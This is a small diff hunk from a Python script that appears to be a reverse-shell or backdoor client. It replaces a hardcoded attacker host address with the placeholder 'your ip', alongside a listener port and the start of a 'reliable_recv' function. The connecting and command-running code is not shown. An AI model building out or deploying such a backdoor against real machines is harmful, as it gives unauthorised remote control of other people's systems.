@@ -5,7 +5,7 @@ import shutil
 import sys
 import subprocess
 
-RHOST = "192.168.234.134"
+RHOST = "your ip"
 RPORT = 4000
 
 def reliable_recv():
